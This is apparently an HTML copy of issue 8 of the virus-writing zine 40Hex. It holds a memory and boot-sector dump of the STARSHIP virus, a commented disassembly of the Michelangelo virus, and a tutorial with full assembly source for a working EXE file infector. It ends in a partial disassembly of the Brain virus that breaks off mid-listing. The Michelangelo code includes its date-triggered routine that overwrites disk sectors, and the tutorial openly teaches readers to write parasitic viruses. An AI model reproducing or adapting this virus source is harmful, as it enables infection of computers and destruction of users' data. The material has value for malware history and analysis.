@@ -1,0 +1,2025 @@
+<html>
+<head><title>Group 42 Sells Out [40H 1.1]</title></head>
+<body background="40hex.jpg">
+<center>
+<h2>40Hex Number 8 Volume 2 Issue 4</h2>
+</center>
+<pre>
+
+Table 1. Layout and size of virus procedures.
+(the box indicates the encrypted memory section)
+
+  Size    Offset (hex)             Description
+
+ 
+    3%    000 - 04F      Variables and buffers (see Fig.1)
+    5%    050 - 0C1      Interrupt 13h handler
+   10%    0C2 - 1C7      Interrupt 21h handler
+   11%    1C8 - 312      Active part & check for DOS ready
+    2%    313 - 340      Random number generator (RND)
+    7%    341 - 3F7      Interrupts 20h, 21h, 27h handlers
+ +--- encrypted --------------------------------------------+
+ | 25%    3F8 - 692      Infector of EXE/COM file includes: |
+ |     9%      3F8 - 4DD      input logic                   |
+ |    10%      4DE - 5E9      create infected code          |
+ |     6%      5EA - 692      output logic                  |
+ |  3%    693 - 6E5      Tables                             |
+ |  3%    6E6 - 738      Startup code for EXE/COM           |
+ | 12%    739 - 88F      Infect disk                        |
+ |  2%    891 - 8BF      Interrupt 01h handler (trace)      |
+ | 11%    8C0 - 9D7      PseudoDOS boot and int B0h handler |
+ +----------------------------------------------------------+
+    4%    9D8 - A4E      Remover of code from videomemory
+    2%    A4F - A8F      Buffers (CS, IP, SS, SP, etc.)
+ 
+
+=======================================================
+
+Table 2. Minimal and maximal sizes of infected
+executable files.
+       +-------------+------------------------+
+       |  File type  |    Minimal   Maximal   |
+       |             |    size      size      |
+       +-------------+------------------------+
+       |             |                        |
+       |   .COM      |    1917      62202     |
+       |             |                        |
+       |   .EXE      |    1917      512 K     |
+       +-------------+------------------------+
+
+==============================================================================
+
+Figure 1. Memory block header (M-block) and memory dump of STARSHIP
+virus located in core RAM. Virus uses segment 18FB, and its memory
+block is at 18F2:0).
+
+------------------- M-memory block containing virus --------------------------
+
+18F2:0000  4D 08 00 B0 00 0A 00 A3-8E 0B A1 0C 00 A3 90 0B   M...............
+
+
+------- PSP of file, which termination caused the virus installation ---------
+
+18F3:0000  CD 20 A3 19 00 9A F0 FE-1D F0 2F 01 0B 18 3C 01   . ......../...<.
+18F3:0010  0B 18 56 05 0B 18 0B 18-01 01 01 00 02 FF FF FF   ..V.............
+18F3:0020  FF FF FF FF FF FF FF FF-FF FF FF FF EE 18 E0 FF   ................
+18F3:0030  00 90 14 00 18 00 F3 18-FF FF FF FF 00 00 00 00   ................
+18F3:0040  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+18F3:0050  CD 21 CB 00 00 00 00 00-00 00 00 00 00 20 20 20   .!...........
+18F3:0060  20 20 20 20 20 20 20 20-00 00 00 00 00 20 20 20           .....
+18F3:0070  20 20 20 20 20 20 20 20-00 00 00 00 00 00 00 00           ........
+
+
+------------------ Here follows the code of virus (CS=18FB) -----------------
+
+18FB:0000  E9 01 10 4E 0A 00 10 00-00 00 00 00 00 42 3A 5C   ...N.........B:\
+18FB:0010  54 4D 50 5C 44 52 4F 5A-46 49 4C 41 2E 43 4F 4D   TMP\DROZFILA.COM
+18FB:0020  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+18FB:0030  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+18FB:0040  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 FF   ................
+18FB:0050  E9 93 06 3E 53 54 41 52-53 48 49 50 5F 31 3C 80   ...>STARSHIP_1<.
+18FB:0060  FA 80 75 41 83 F9 01 75-3F 0A F6 75 38 80 FC 02   ..uA...u?..u8...
+18FB:0070  75 29 1E 50 E8 13 03 58-9C FF 1E B8 04 1F 72 18   u).P...X......r.
+18FB:0080  50 56 72 16 B8 01 00 BE-BE 01 26 89 40 02 B0 01   PVr.......&.@...
+18FB:0090  26 88 40 01 5E 58 F8 FB-EB 7C 3C 80 FC 03 74 F6   &.@.^X...|<...t.
+18FB:00A0  80 FC 05 74 F1 E9 3E 01-80 FE 08 75 F8 51 02 C8   ...t..>....u.Q..
+18FB:00B0  80 F9 CC 59 72 EF 80 FD-FE 72 EA 80 FC 02 74 D6   ...Yr....r....t.
+18FB:00C0  75 D9 FF F1 E8 9C 2E 80-3E 4F 00 00 75 18 50 1E   u.......>O..u.P.
+18FB:00D0  8C C8 2D 09 00 E8 A9 02-A1 3C 00 48 E8 A2 02 2E   ..-......<.H....
+18FB:00E0  F6 16 4F 00 1F 58 80 FC-3C 75 31 2E 83 3E 0B 00   ..O..X..<u1..>..
+18FB:00F0  00 75 6E E8 6E 00 75 69-9D E8 CC 00 72 18 50 51   .un.n.ui....r.PQ
+
+
+==================================================================
+
+Figure 2. Dump of pseudoDOS boot sector
+(thin line denotes random garbage).
+
+   0000  EB 34 90 4D 53 BF 05 00-CD 13 73 09 32 E4 CD 13   .4.MS.....s.2...
+   0010  4F 75 F5 CD 18 C3 B9 01-00 E8 E9 FF 80 3E 00 7E   Ou...........>.~
+   0020  EB 75 10 A0 02 7E BB 00-7E E8 97 00 0A E4 74 03   .u...~..~.....t.
+   0030  80 EF 02 06 53 CB FA 33-C0 8E D0 BC 00 7C 8B F4   ....S..3.....|..
+   0040  8E C0 8E D8 FB FC BF 00-06 B9 00 01 F3 A5 EA 53   ...............S
+   0050  06 00 00 B9 37 00 BE D6-06 BF C0 02 F3 A4 BF B0   ....7...........
+   0060  04 B9 08 00 F3 A4 1E C5-06 4C 00 AB 8C D8 AB 1F   .........L......
+   0070  FE 06 FC 7D A1 FC 7D B9-CC FE BB 00 7C BA 80 08   ...}..}.....|...
+   0080  0A C0 74 08 50 B8 01 03-E8 7A FF 58 41 89 0E DB   ..t.P....z.XA...
+   0090  02 88 36 DF 02 06 BB 00-BB 8E C3 88 26 E7 02 CD   ..6.........&...
+   00A0  B0 26 A2 63 01 26 8C 1E-C2 00 07 FA C7 06 4C 00   .&.c.&........L.
+   00B0  B0 04 8C 1E 4E 00 FB BB-00 7C B8 06 02 BA 80 00   ....N....|......
+   00C0  E9 53 FF 53 51 B9 0A 0A-32 E4 26 30 07 26 02 27   .S.SQ...2.&0.&.'
+   00D0  43 E2 F7 59 5B C3 C4 02-00 00 50 06 53 B8 00 BB   C..Y[.....P.S...
+   00E0  8E C0 BB 50 00 26 80 3F-E9 74 1E 52 51 B8 05 02   ...P.&.?.t.RQ...
+   00F0  B9 00 00 BA 80 00 9C 2E-FF 1E B8 04 B0 00 B9 0A   ................
+   0100  0A 26 30 07 43 E2 FA 59-5A 5B 07 58 CF CD B0 9A   .&0.C..YZ[.X....
+                       +--------------------------------+
+   0110  5F 00 00 BB EA|1E 0E 1F-8E C0 33 FF 50 FC 32 C0|  _.........3.P.2.
+  +--------------------+                                |
+  |0120  B9 50 00 F3 AA E8 F6 F7-8B F7 B9 0A 0A F3 A4 E8|  .P..............
+  |0130  98 F9 58 FA A3 B5 04 A3-C1 04 B8 90 90 A3 B0 04|  ..X.............
+  |0140  A3 BC 04 C7 06 BF 04 C5-00 B8 EB 05 A3 C8 04 B8|  ................
+  |0150  EB F4 A3 D4 04 BF CA 04-BE DB 04 06 1E 07 A5 A5|  ................
+  |0160  A4 FB A3 D9 04 A3 C8 02-C7 06 E0 02 CD 13 C7 06|  ................
+  |0170  E2 02 EB 0D FE 06 D9 02-CD B0 B9 37 00 BF C0 02|  ...........7....
+  |0180  1E 07 8C D8 F3 AA 07 1F-C3 B4 62 E8 7A F7 C3 90|  ..........b.z...
+  |0190  90 90 90 90 90 90 90 90-90 90 A4 4B 4C EA A6 8C|  ...........KL...
+  |01A0  BE 23 54 F4 BC E8 B8 6B-5B F1 B2 EC B2 81 5E F6|  .#T....k[.....^.
+  |01B0  88 D0 8C BC 64 CC 8E CC-86 69 6A C2 84 C8 80 6F|  ....d....ij....o
+  |01C0  FA 2B C0 8E D0 8E C0 8E-D8 B8 00 7C 8B E0 FB 8B|  .+.........|....
+  |01D0  F0 BF 00 7E FC B9 00 01-F3 A5 E9 00 02 B9 10 00|  ...~............
+  |01E0  8B 36 85 7E F6 04 80 75-08 83 EE 10 E2 F6 EB 37|  .6.~...u.......7
+  |                                   +-----------------+
+  |01F0  90 BF BE 07 57 B9 08 00-F3 A5|74 91 05 AD 55 AA   ....W.....t...U.
+  +-----------------------------------+
+
+==================================================================
+Figure 3. Dispatcher code located at absolute address 0:4B0.
+
+
+
+        a) virus code located in videomemory
+
+0000:04B0  CD B0              INT  B0        <== int 13h
+0000:04B2  9A 5F 00 00 BB     CALL BB00:005F
+0000:04B7  EA 3D A3 00 F0     JMP  F000:A33D
+
+0000:04BC  CD B0              INT  B0        <== int 21h
+0000:04BE  9A D6 03 00 BB     CALL BB00:03D6
+0000:04C3  EA 60 14 73 02     JMP  0273:1460
+
+0000:04C8  CD B0              INT  B0        <== int 20h
+0000:04CA  9A DD 03 00 BB     CALL BB00:03DD
+0000:04CF  EA 3F 14 73 02     JMP  0273:143F
+
+0000:04D4  CD B0              INT  B0        <== int 27h
+0000:04D6  9A 93 03 00 BB     CALL BB00:0393
+0000:04DB  EA 66 63 73 02     JMP  0273:6366
+
+
+
+        b) after removing of code from videomemory
+           (segment CS=18FB is where virus resides)
+
+
+0000:04B0  90                 NOP            <== int 13h
+0000:04B1  90                 NOP
+0000:04B2  9A 5F 00 6D 19     CALL 18FB:005F
+0000:04B7  EA 3D A3 00 F0     JMP  F000:A33D
+
+0000:04BC  90                 NOP            <== int 21h
+0000:04BD  90                 NOP
+0000:04BE  9A C5 00 6D 19     CALL 18FB:00C5
+0000:04C3  EA 3D A3 00 F0     JMP  0273:1460
+
+0000:04C8  EB 05              JMP  4CF       <== int 20h
+0000:04CA  EA 3F 14 73 02     JMP  0273:143F
+0000:04CF  EA 66 63 73 02     JMP  0273:6366
+0000:04D4  EB F4              JMP  4CA       <== int 27h
+
+===============================================================
+All  corrections and  remarks will be greatly appreciated. Send
+information directly via E-mail address (MIG@politon.msk.su) or
+in  comp.virus group of USENET (I am monitoring it permanently).
+
+F   .rs mbyt-  tF   .rs mbyt-  tF   .  (What is this? -Ed.)
+40Hex Number 8 Volume 2 Issue 4                                       File 006
+
+; This is a disassembly of the much-hyped michelangelo virus.
+; As you can see, it is a derivative of the Stoned virus.  The
+; junk bytes at the end of the file are probably throwbacks to
+; the Stoned virus.  In any case, it is yet another boot sector
+; and partition table infector.
+
+michelangelo    segment byte public
+                assume  cs:michelangelo, ds:michelangelo
+; Disassembly by Dark Angel of PHALCON/SKISM
+                org     0
+
+                jmp     entervirus
+highmemjmp      db      0F5h, 00h, 80h, 9Fh
+maxhead         db      2                       ; used by damagestuff
+firstsector     dw      3
+oldint13h       dd      0C8000256h
+
+int13h:
+                push    ds
+                push    ax
+                or      dl, dl                  ; default drive?
+                jnz     exitint13h              ; exit if not
+                xor     ax, ax
+                mov     ds, ax
+                test    byte ptr ds:[43fh], 1   ; disk 0 on?
+                jnz     exitint13h              ; if not spinning, exit
+                pop     ax
+                pop     ds
+                pushf
+                call    dword ptr cs:[oldint13h]; first call old int 13h
+                pushf
+                call    infectdisk              ; then infect
+                popf
+                retf    2
+exitint13h:     pop     ax
+                pop     ds
+                jmp     dword ptr cs:[oldint13h]
+
+infectdisk:
+                push    ax
+                push    bx
+                push    cx
+                push    dx
+                push    ds
+                push    es
+                push    si
+                push    di
+                push    cs
+                pop     ds
+                push    cs
+                pop     es
+                mov     si, 4
+readbootblock:
+                mov     ax,201h                 ; Read boot block to
+                mov     bx,200h                 ; after virus
+                mov     cx,1
+                xor     dx,dx
+                pushf
+                call    oldint13h
+                jnc     checkinfect             ; continue if no error
+                xor     ax,ax
+                pushf
+                call    oldint13h               ; Reset disk
+                dec     si                      ; loop back
+                jnz     readbootblock
+                jmp     short quitinfect        ; exit if too many failures
+checkinfect:
+                xor     si,si
+                cld
+                lodsw
+                cmp     ax,[bx]                 ; check if already infected
+                jne     infectitnow
+                lodsw
+                cmp     ax,[bx+2]               ; check again
+                je      quitinfect
+infectitnow:
+                mov     ax,301h                 ; Write old boot block
+                mov     dh,1                    ; to head 1
+                mov     cl,3                    ; sector 3
+                cmp     byte ptr [bx+15h],0FDh  ; 360k disk?
+                je      is360Kdisk
+                mov     cl,0Eh
+is360Kdisk:
+                mov     firstsector,cx
+                pushf
+                call    oldint13h
+                jc      quitinfect              ; exit on error
+                mov     si,200h+offset partitioninfo
+                mov     di,offset partitioninfo
+                mov     cx,21h                  ; Copy partition table
+                cld
+                rep     movsw
+                mov     ax,301h                 ; Write virus to sector 1
+                xor     bx,bx
+                mov     cx,1
+                xor     dx,dx
+                pushf
+                call    oldint13h
+quitinfect:
+                pop     di
+                pop     si
+                pop     es
+                pop     ds
+                pop     dx
+                pop     cx
+                pop     bx
+                pop     ax
+                retn
+entervirus:
+                xor     ax,ax
+                mov     ds,ax
+                cli
+                mov     ss,ax
+                mov     ax,7C00h                ; Set stack to just below
+                mov     sp,ax                   ; virus load point
+                sti
+                push    ds                      ; save 0:7C00h on stack for
+                push    ax                      ; later retf
+                mov     ax,ds:[13h*4]
+                mov     word ptr ds:[7C00h+offset oldint13h],ax
+                mov     ax,ds:[13h*4+2]
+                mov     word ptr ds:[7C00h+offset oldint13h+2],ax
+                mov     ax,ds:[413h]            ; memory size in K
+                dec     ax                      ; 1024 K
+                dec     ax
+                mov     ds:[413h],ax            ; move new value in
+                mov     cl,6
+                shl     ax,cl                   ; ax = paragraphs of memory
+                mov     es,ax                   ; next line sets seg of jmp
+                mov     word ptr ds:[7C00h+2+offset highmemjmp],ax
+                mov     ax,offset int13h
+                mov     ds:[13h*4],ax
+                mov     ds:[13h*4+2],es
+                mov     cx,offset partitioninfo
+                mov     si,7C00h
+                xor     di,di
+                cld
+                rep     movsb                   ; copy to high memory
+                                                ; and transfer control there
+                jmp     dword ptr cs:[7C00h+offset highmemjmp]
+; destination of highmem jmp
+                xor     ax,ax
+                mov     es,ax
+                int     13h                     ; reset disk
+                push    cs
+                pop     ds
+                mov     ax,201h
+                mov     bx,7C00h
+                mov     cx,firstsector
+                cmp     cx,7                    ; hard disk infection?
+                jne     floppyboot              ; if not, do floppies
+                mov     dx,80h                  ; Read old partition table of
+                int     13h                     ; first hard disk to 0:7C00h
+                jmp     short exitvirus
+floppyboot:
+                mov     cx,firstsector          ; read old boot block
+                mov     dx,100h                 ; to 0:7C00h
+                int     13h
+                jc      exitvirus
+                push    cs
+                pop     es
+                mov     ax,201h                 ; read boot block
+                mov     bx,200h                 ; of first hard disk
+                mov     cx,1
+                mov     dx,80h
+                int     13h
+                jc      exitvirus
+                xor     si,si
+                cld
+                lodsw
+                cmp     ax,[bx]                 ; is it infected?
+                jne     infectharddisk          ; if not, infect HD
+                lodsw                           ; check infection
+                cmp     ax,[bx+2]
+                jne     infectharddisk
+exitvirus:
+                xor     cx,cx                   ; Real time clock get date
+                mov     ah,4                    ; dx = mon/day
+                int     1Ah
+                cmp     dx,306h                 ; March 6th
+                je      damagestuff
+                retf                            ; return control to original
+                                                ; boot block @ 0:7C00h
+damagestuff:
+                xor     dx,dx
+                mov     cx,1
+smashanothersector:
+                mov     ax,309h
+                mov     si,firstsector
+                cmp     si,3
+                je      smashit
+                mov     al,0Eh
+                cmp     si,0Eh
+                je      smashit
+                mov     dl,80h                  ; first hard disk
+                mov     maxhead,4
+                mov     al,11h
+smashit:
+                mov     bx,5000h                ; random memory area
+                mov     es,bx                   ; at 5000h:5000h
+                int     13h                     ; Write al sectors to drive dl
+                jnc     skiponerror             ; skip on error
+                xor     ah,ah                   ; Reset disk drive dl
+                int     13h
+skiponerror:
+                inc     dh                      ; next head
+                cmp     dh,maxhead              ; 2 if floppy, 4 if HD
+                jb      smashanothersector
+                xor     dh,dh                   ; go to next head/cylinder
+                inc     ch
+                jmp     short smashanothersector
+infectharddisk:
+                mov     cx,7                    ; Write partition table to
+                mov     firstsector,cx          ; sector 7
+                mov     ax,301h
+                mov     dx,80h
+                int     13h
+                jc      exitvirus
+                mov     si,200h+offset partitioninfo ; Copy partition
+                mov     di,offset partitioninfo      ; table information
+                mov     cx,21h
+                rep     movsw
+                mov     ax,301h                 ; Write to sector 8
+                xor     bx,bx                   ; Copy virus to sector 1
+                inc     cl
+                int     13h
+;*              jmp     short 01E0h
+                db      0EBh, 32h               ; ?This should crash?
+; The following bytes are meaningless.
+garbage         db      1,4,11h,0,80h,0,5,5,32h,1,0,0,0,0,0,53h
+partitioninfo:  db      42h dup (0)
+michelangelo    ends
+                end
+
+40Hex Number 8 Volume 2 Issue 4                                       File 007
+
+                    ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+                    An Introduction to Nonoverwriting Virii
+                            Part II: EXE Infectors
+                                 By Dark Angel
+                    ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  
+       In the  last issue  of 40Hex,  I presented  theory and  code  for  the
+  nonoverwriting  COM   infector,  the   simplest  of  all  parasitic  virii.
+  Hopefully, having  learned COM  infections cold,  you are now ready for EXE
+  infections.  There is a grey veil covering the technique of EXE infections,
+  as the majority of virii are COM-only.
+  
+       EXE infections  are, in  some  respects,  simpler  than  COM  viruses.
+  However, to  understand the infection, you must understand the structure of
+  EXE files  (naturally).   EXE files  are structured into segments which are
+  loaded consecutively  atop one  another.  Thus, all an EXE infector must do
+  is create  its own  segment in  the EXE  file and  alter  the  entry  point
+  appropriately.   Therefore, EXE  infections do  not require  restoration of
+  bytes of  code, but  rather involve  the manipulation  of the  header which
+  appears in  the beginning every EXE file and the appending of viral code to
+  the infected file.  The format of the header follows:
+  
+   Offset Description
+     00   ID word, either 'MZ' or 'ZM'
+     02   Number of bytes in the last (512 byte) page in the image
+     04   Total number of 512 byte pages in the file
+     06   Number of entries in the segment table
+     08   Size of the header in (16 byte) paragraphs
+     0A   Minimum memory required in paragraphs
+     0C   Maximum memory requested in paragraphs
+     0E   Initial offset in paragraphs to stack segment from header
+     10   Initial offset in bytes of stack pointer from stack segment
+     12   Negative checksum (ignored)
+     14   Initial offset in bytes of instruction pointer from code segment
+     16   Initial offset in paragraphs of code segment from header
+     18   Offset of relocation table from start of file
+     1A   Overlay number (ignored)
+  
+  The ID  word is  generally 'ZM'  (in the  Intel little-endian format).  Few
+  files start  with the  alternate form,  'MZ' (once  again in  Intel little-
+  endian format).   To  save space, a check for the alternate form of the EXE
+  ID in  the virus  may be omitted, although a few files may be corrupted due
+  to this omission.
+  
+  The words  at offsets  2 and  4 are related.  The word at offset 4 contains
+  the filesize  in pages.   A  page is  a 512 byte chunk of memory, just as a
+  word is  a two  byte chunk of memory.  This number is rounded up, so a file
+  of length  514 bytes  would contain a 2 at offset 4 in the EXE header.  The
+  word at offset 2 is the image length modulo 512.  The image length does not
+  include the  header length.   This  is one of the bizarre quirks of the EXE
+  header.   Since the header length is usually a multiple of 512 anyway, this
+  quirk usually  does not  matter.  If the word at offset 2 is equal to four,
+  then it  is generally  ignored (heck,  it's never really used anyway) since
+  pre-1.10 versions  of the  Microsoft linker had a bug which caused the word
+  to always  be equal  to four.  If you are bold, the virus can set this word
+  to 4.   However, keep in mind that this was a bug of the linker and not all
+  command interpreters may recognise this quirk.
+  
+  The minimum memory required by the program (offset A) can be ignored by the
+  virus, as  the maximum  memory is generally allocated to the program by the
+  operating system.   However,  once again,  ignoring this area of the header
+  MAY cause  an unsucessful  infection.   Simply adding  the  virus  size  in
+  paragraphs to this value can nullify the problem.
+  
+  The words  representing the  initial stack segment and pointer are reversed
+  (not in  little-endian format).   In  other words,  an LES to this location
+  will yield  the stack  pointer in  ES and  the  stack  segment  in  another
+  register.   The initial  SS:SP is  calculated  with  the  base  address  of
+  0000:0000 being at the end of the header.
+  
+  Similarly, the  initial CS:IP  (in little-endian format) is calculated with
+  the base  address of  0000:0000 at  the end of the header.  For example, if
+  the program  entry point  appears directly after the header, then the CS:IP
+  would be 0000:0000.  When the program is loaded, the PSP+10 is added to the
+  segment value (the extra 10 accounts for the 100h bytes of the PSP).
+  
+  All the  relevant portions  of the  EXE header  have been covered.  So what
+  should be  done to  write a  nonoverwriting EXE infector?  First, the virus
+  must be appended to the end of the file.  Second, the initial CS:IP must be
+  saved and  subsequently changed  in the  header.   Third, the initial SS:SP
+  should also  be saved  and changed.   This  is to avoid any possible memory
+  conflicts from  the stack  overwriting viral  code.   Fourth, the file size
+  area of  the header should be modified to correctly reflect the new size of
+  the file.   Fifth,  any additional  safety modifications such as increasing
+  the minimum  memory allocation  should be made.  Last, the header should be
+  written to the infected file.
+  
+  There are  several good areas for ID bytes in the EXE header.  The first is
+  in the stack pointer field.  Since it should be changed anyway, changing it
+  to a  predictable number  would add nothing to the code length.  Make sure,
+  however, to  make the stack pointer high enough to prevent code overwrites.
+  Another common  area for ID bytes is in the negative checksum field.  Since
+  it is  an unused  field, altering  it won't  affect the  execution  of  any
+  programs.
+  
+  One further item should be mentioned before the code for the EXE infector.
+  It is important to remember that EXE files are loaded differently than COM
+  files.  Although a PSP is still built, the initial CS does NOT point to it.
+  Instead, it points to wherever the entry point happens to be.  DS and ES
+  point to the PSP, and therefore do NOT point to the entry point (your virus
+  code).  It is important to restore DS and ES to their proper values before
+  returning control to the EXE.
+  
+  ----cut here---------------------------------------------------------------
+  
+  .model tiny                             ; Handy TASM directive
+  .code                                   ; Virus code segment
+            org 100h                      ; COM file starting IP
+  ; Cheesy EXE infector
+  ; Written by Dark Angel of PHALCON/SKISM
+  ; For 40Hex Number 8 Volume 2 Issue 4
+  id = 'DA'                               ; ID word for EXE infections
+  
+  startvirus:                             ; virus code starts here
+            call next                     ; calculate delta offset
+  next:     pop  bp                       ; bp = IP next
+            sub  bp,offset next           ; bp = delta offset
+  
+            push ds
+            push es
+            push cs                       ; DS = CS
+            pop  ds
+            push cs                       ; ES = CS
+            pop  es
+            lea  si,[bp+jmpsave2]
+            lea  di,[bp+jmpsave]
+            movsw
+            movsw
+            movsw
+            movsw
+  
+            mov  ah,1Ah                   ; Set new DTA
+            lea  dx,[bp+newDTA]           ; new DTA @ DS:DX
+            int  21h
+  
+            lea  dx,[bp+exe_mask]
+            mov  ah,4eh                   ; find first file
+            mov  cx,7                     ; any attribute
+  findfirstnext:
+            int  21h                      ; DS:DX points to mask
+            jc   done_infections          ; No mo files found
+  
+            mov  al,0h                    ; Open read only
+            call open
+  
+            mov  ah,3fh                   ; Read file to buffer
+            lea  dx,[bp+buffer]           ; @ DS:DX
+            mov  cx,1Ah                   ; 1Ah bytes
+            int  21h
+  
+            mov  ah,3eh                   ; Close file
+            int  21h
+  
+  checkEXE: cmp  word ptr [bp+buffer+10h],id ; is it already infected?
+            jnz  infect_exe
+  find_next:
+            mov  ah,4fh                   ; find next file
+            jmp  short findfirstnext
+  done_infections:
+            mov  ah,1ah                   ; restore DTA to default
+            mov  dx,80h                   ; DTA in PSP
+            pop  es
+            pop  ds                       ; DS->PSP
+            int  21h
+            mov  ax,es                    ; AX = PSP segment
+            add  ax,10h                   ; Adjust for PSP
+            add  word ptr cs:[si+jmpsave+2],ax
+            add  ax,word ptr cs:[si+stacksave+2]
+            cli                           ; Clear intrpts for stack manip.
+            mov  sp,word ptr cs:[si+stacksave]
+            mov  ss,ax
+            sti
+            db   0eah                     ; jmp ssss:oooo
+  jmpsave             dd ?                ; Original CS:IP
+  stacksave           dd ?                ; Original SS:SP
+  jmpsave2            dd 0fff00000h       ; Needed for carrier file
+  stacksave2          dd ?
+  
+  creator             db '[MPC]',0,'Dark Angel of PHALCON/SKISM',0
+  virusname           db '[DemoEXE] for 40Hex',0
+  
+  infect_exe:
+            les  ax, dword ptr [bp+buffer+14h] ; Save old entry point
+            mov  word ptr [bp+jmpsave2], ax
+            mov  word ptr [bp+jmpsave2+2], es
+  
+            les  ax, dword ptr [bp+buffer+0Eh] ; Save old stack
+            mov  word ptr [bp+stacksave2], es
+            mov  word ptr [bp+stacksave2+2], ax
+  
+            mov  ax, word ptr [bp+buffer + 8] ; Get header size
+            mov  cl, 4                        ; convert to bytes
+            shl  ax, cl
+            xchg ax, bx
+  
+            les  ax, [bp+offset newDTA+26]; Get file size
+            mov  dx, es                   ; to DX:AX
+            push ax
+            push dx
+  
+            sub  ax, bx                   ; Subtract header size from
+            sbb  dx, 0                    ; file size
+  
+            mov  cx, 10h                  ; Convert to segment:offset
+            div  cx                       ; form
+  
+            mov  word ptr [bp+buffer+14h], dx ; New entry point
+            mov  word ptr [bp+buffer+16h], ax
+  
+            mov  word ptr [bp+buffer+0Eh], ax ; and stack
+            mov  word ptr [bp+buffer+10h], id
+  
+            pop  dx                       ; get file length
+            pop  ax
+  
+            add  ax, heap-startvirus      ; add virus size
+            adc  dx, 0
+  
+            mov  cl, 9                    ; 2**9 = 512
+            push ax
+            shr  ax, cl
+            ror  dx, cl
+            stc
+            adc  dx, ax                   ; filesize in pages
+            pop  ax
+            and  ah, 1                    ; mod 512
+  
+            mov  word ptr [bp+buffer+4], dx ; new file size
+            mov  word ptr [bp+buffer+2], ax
+  
+            push cs                       ; restore ES
+            pop  es
+  
+            mov  cx, 1ah
+  finishinfection:
+            push cx                       ; Save # bytes to write
+            xor  cx,cx                    ; Clear attributes
+            call attributes               ; Set file attributes
+  
+            mov  al,2
+            call open
+  
+            mov  ah,40h                   ; Write to file
+            lea  dx,[bp+buffer]           ; Write from buffer
+            pop  cx                       ; cx bytes
+            int  21h
+  
+            mov  ax,4202h                 ; Move file pointer
+            xor  cx,cx                    ; to end of file
+            cwd                           ; xor dx,dx
+            int  21h
+  
+            mov  ah,40h                   ; Concatenate virus
+            lea  dx,[bp+startvirus]
+            mov  cx,heap-startvirus       ; # bytes to write
+            int  21h
+  
+            mov  ax,5701h                 ; Restore creation date/time
+            mov  cx,word ptr [bp+newDTA+16h] ; time
+            mov  dx,word ptr [bp+newDTA+18h] ; date
+            int  21h
+  
+            mov  ah,3eh                   ; Close file
+            int  21h
+  
+            mov ch,0
+            mov cl,byte ptr [bp+newDTA+15h] ; Restore original
+            call attributes                 ; attributes
+  
+  mo_infections: jmp find_next
+  
+  open:
+            mov  ah,3dh
+            lea  dx,[bp+newDTA+30]        ; filename in DTA
+            int  21h
+            xchg ax,bx
+            ret
+  
+  attributes:
+            mov  ax,4301h                 ; Set attributes to cx
+            lea  dx,[bp+newDTA+30]        ; filename in DTA
+            int  21h
+            ret
+  
+  exe_mask            db '*.exe',0
+  heap:                                   ; Variables not in code
+  newDTA              db 42 dup (?)       ; Temporary DTA
+  buffer              db 1ah dup (?)      ; read buffer
+  endheap:                                ; End of virus
+  
+  end       startvirus
+  
+  ----cut here---------------------------------------------------------------
+  
+  This is a simple EXE infector.  It has limitations; for example, it does
+  not handle misnamed COM files.  This can be remedied by a simple check:
+  
+    cmp [bp+buffer],'ZM'
+    jnz misnamed_COM
+  continueEXE:
+  
+  Take special notice of the done_infections and infect_exe procedures.  They
+  handle all  the relevant portions of the EXE infection.  The restoration of
+  the EXE  file simply  consists of  resetting the stack and a far jmp to the
+  original entry point.
+  
+  A final  note on  EXE infections: it is often helpful to "pad" EXE files to
+  the nearest  segment.  This accomplishes two things.  First, the initial IP
+  is  always  0,  a  fact  which  can  be  used  to  eliminate  delta  offset
+  calculations.   Code space  can be  saved by  replacing all  those annoying
+  relative memory  addressing statements  ([bp+offset blip])  statements with
+  their absolute  counterparts (blip).   Second, recalculation of header info
+  can be  handled in  paragraphs, simplifying  it tremendously.  The code for
+  this is left as an exercise for the reader.
+  
+  This file is dedicated to the [XxXX] (Censored. -Ed.) programmers (who have
+  yet to figure out how to  write EXE  infectors).  Hopefully, this  text can
+  teach them (and everyone else) how to progress beyond simple COM and spawn-
+  ing EXE infectors.   In the next issue of 40Hex,  I will present the theory
+  and code for the next step of file infector - the coveted SYS file.
+40Hex Number 8 Volume 2 Issue 4                                       File 008
+
+; This is the ashar variant of the classic Pakistani Brain virus. It is large
+; by today's standards, although it was one of the first.  It is a floppy only
+; boot sector infector.
+
+brain           segment byte public
+                assume  cs:brain, ds:brain
+; Disassembly done by Dark Angel of PHALCON/SKISM
+                org     0
+
+                cli
+                jmp     entervirus
+idbytes         db       34h, 12h
+firsthead       db      0
+firstsector     dw      2707h
+curhead         db      0
+cursector       dw      1
+                db      0, 0, 0, 0
+                db      'Welcome to the  Dungeon         '
+copyright       db      '(c) 1986 Brain'
+                db      17h
+                db      '& Amjads (pvt) Ltd   VIRUS_SHOE '
+                db      ' RECORD   v9.0   Dedicated to th'
+                db      'e dynamic memories of millions o'
+                db      'f virus who are no longer with u'
+                db      's today - Thanks GOODNESS!!     '
+                db      '  BEWARE OF THE er..VIRUS  : \th'
+                db      'is program is catching      prog'
+                db      'ram follows after these messeges'
+                db      '..... $'
+                db      '#@%$'
+                db      '@!! '
+entervirus:
+                mov     ax,cs
+                mov     ds,ax                   ; ds = 0
+                mov     ss,ax                   ; set stack to after
+                mov     sp,0F000h               ; virus
+                sti
+                mov     al,ds:[7C00h+offset firsthead]
+                mov     ds:[7C00h+offset curhead],al
+                mov     cx,ds:[7C00h+offset firstsector]
+                mov     ds:[7C00h+offset cursector],cx
+                call    calcnext
+                mov     cx,5                    ; read five sectors
+                mov     bx,7C00h+200h           ; after end of virus
+
+loadnext:
+                call    readdisk
+                call    calcnext
+                add     bx,200h
+                loop    loadnext
+
+                mov     ax,word ptr ds:[413h]   ; Base memory size in Kb
+                sub     ax,7                    ; - 7 Kb
+                mov     word ptr ds:[413h],ax   ; Insert as new value
+                mov     cl,6
+                shl     ax,cl                   ; Convert to paragraphs
+                mov     es,ax
+                mov     si,7C00h                ; Copy from virus start
+                mov     di,0                    ; to start of memory
+                mov     cx,1004h                ; Copy 1004h bytes
+                cld
